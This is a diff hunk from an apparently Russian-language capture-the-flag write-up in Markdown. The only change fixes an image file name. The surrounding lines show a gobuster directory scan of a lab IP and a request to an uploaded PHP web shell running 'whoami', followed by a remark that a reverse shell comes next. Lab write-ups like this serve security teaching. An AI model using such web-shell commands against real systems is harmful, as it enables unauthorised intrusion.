@@ -87,7 +87,7 @@ gobuster dir -u http://10.114.148.4 -w /usr/share/wordlists/dirb/common.txt -x p
 http://10.114.148.4/uploads/shell.phtml?cmd=whoami
 ```
 
-![Login page](images/uploads-shell-result.jpg)
+![Login page](images/uploads-shell-results.jpg)
 
 И да, всё работает. Теперь пришло время получать **reverse-shell**
 
